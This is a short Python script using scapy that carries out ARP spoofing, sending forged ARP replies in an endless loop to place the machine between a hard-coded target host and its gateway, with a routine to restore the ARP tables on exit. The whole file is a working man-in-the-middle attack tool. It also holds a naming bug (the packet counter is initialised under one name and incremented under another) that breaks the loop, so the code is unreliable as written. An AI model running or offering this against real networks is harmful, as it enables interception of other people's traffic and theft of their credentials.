import scapy.all as scapy
import time
from scapy.layers.l2 import ARP
from scapy.sendrecv import srp


def getMAC(IP):
    resp, unans = srp(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=IP), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


def spoofing(targetIP, spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=getMAC(targetIP), psrc=spoofIP)
    scapy.send(packet, verbose=False)


def restore(destinationIP, sourceIP):
    destinationMAC = getMAC(destinationIP)
    sourceMAC = getMAC(sourceIP)
    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    scapy.send(packet, verbose=False)


targetIP = "192.168.43.182"  # Enter your target IP
gatewayIP = "192.168.43.1"  # Enter your gateway's IP

try:
    sent_packets_count = 0
    while True:
        spoofing(targetIP, gatewayIP)
        spoofing(gatewayIP, targetIP)
        sentPacketsCount = sentPacketsCount + 2
        print("\r[*] Packets Sent " + str(sentPacketsCount) + "\n", end="")
        time.sleep(2)  # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gatewayIP, targetIP)
    restore(targetIP, gatewayIP)
    print("[+] Arp Spoof Stopped")
